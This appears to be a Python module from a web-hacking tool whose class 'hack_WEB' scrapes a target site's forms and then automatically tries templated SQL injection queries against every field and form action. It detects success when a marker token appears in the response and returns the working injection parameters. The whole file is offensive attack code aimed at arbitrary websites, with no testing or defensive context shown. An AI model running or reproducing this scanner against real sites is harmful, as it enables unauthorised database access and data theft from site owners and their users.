from urllib.request import urlopen
from ..algorithm.app import App
from bs4 import BeautifulSoup
import sys
import re

class hack_WEB(App):
    def __init__(self, obj):
        self.obj = obj
        self.sql_sep = ', ' #by default
        self.main_url = self.obj['url_website']
        self.TOKEN = self.obj['app_token']
        self.setJSON(self.obj['dir_hostHash'])

    #STUDING HTML WEBPAGE
    def HTMLformOBJ(self):
        OBJ = {"url":[],"name":[],"method":[]}
        html = urlopen(self.main_url)
        soup = BeautifulSoup(html.read(), features="html.parser")
        try:
            values = soup.find_all('form')
            for value in values:
                v = value.get('action')
                if v:
                    OBJ["url"].append(v)
        except:
            return []
        try:
            values = soup.find_all("input")
            for value in values:
                v = value.get('name')
                if v:
                    OBJ["name"].append(v)
        except:
            return []
        try:
            values = soup.find_all('form')
            for val in values:
                v = val.get('method')
                if v:
                    OBJ["method"].append(v.upper())
        except:
            pass
        return OBJ
        
    # RESUME ABOUT WEBSITE
    def injectSQL(self, OBJ):
        jOBJ = self.getJSON(self.obj['dir_querypiece'])
        queries = self.getJSON(self.obj['dir_queryinject'])
        sys.stdout.write('\n>>> Looking for the vulnerability of the webpage..')
        sys.stdout.write('\nLoading: ')
        for q in range(0, len(queries)):
            for fulltable in self.joinDBTB( jOBJ ):
                for column in jOBJ['column']:
                    for comment in jOBJ['comment']:
                        for sep in jOBJ['sep']:
                            for limit in jOBJ['limit']: 
                                cat = ''
                                for _ in range(0, jOBJ['max_column']):
                                    columns = 'concat('+ self.parseCHAR(self.TOKEN, self.sql_sep) +')' + cat
                                    sidecolumn = cat
                                    query = queries[q]
                                    query = re.sub(r'(<%COLUMN%>)', columns, query)
                                    query = re.sub(r'(<%TABLE%>)', fulltable, query)
                                    LIMIT = limit.replace('<%X%>', '0').replace('<%Y%>', '1')
                                    query = re.sub(r'(<%LIMIT%>)', LIMIT, query)
                                    query = re.sub(r'(<%COMMENT%>)', comment, query)
                                    cat += sep + column
                                    obj = {}

                                    for attr in OBJ['name']:
                                        obj.update({ attr : query })

                                    for url in OBJ['url']:
                                        serverurl = self.joinURL(self.main_url, url)
                                        for m in range(0, len(OBJ['method'])):
                                            rp = self.sendRequest(serverurl, obj, OBJ['method'][m])
                                            rp = self.TOKEN in rp
                                            sys.stdout.write('.')
                                            sys.stdout.flush()
                                            if rp :
                                                sys.stdout.flush()
                                                sys.stdout.write(' done!\n')
                                                return {
                                                    "sql" : {
                                                        "sidecolumn" : sidecolumn,
                                                        "serverurl" : serverurl,
                                                        "limit" : limit,
                                                        "sep" : sep,
                                                        "comment" : comment,
                                                        "sqlinjectpos" : q,
                                                        "field" : OBJ['name'],
                                                        "method" : OBJ['method'][m]
                                                    },
                                                    "obj": self.obj
                                                }
        sys.stdout.write("\nOur algorithm cannot detect failures on this website!\b\n")
        return {}